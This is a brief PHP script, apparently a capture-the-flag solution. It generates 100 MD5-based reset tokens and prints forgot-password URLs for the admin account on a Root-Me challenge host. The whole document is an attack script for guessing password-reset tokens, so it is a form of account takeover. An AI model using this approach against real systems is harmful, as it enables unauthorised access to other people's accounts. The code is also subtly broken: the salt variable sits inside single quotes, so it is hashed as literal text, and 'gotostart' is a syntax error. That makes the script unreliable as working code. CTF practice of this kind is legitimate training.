<?php
$base = 1;
$num = 1;
start:
    if ($num < "101")
    {
        $salt = microtime();
        $token = MD5('$salt' . $num);
        echo "http://challenge01.root-me.org/realiste/ch14/?p=forgot_dev&username=admin&token=$token\n";
        ++$num;
        gotostart;
    }
    else
    {
        die();
    }
?>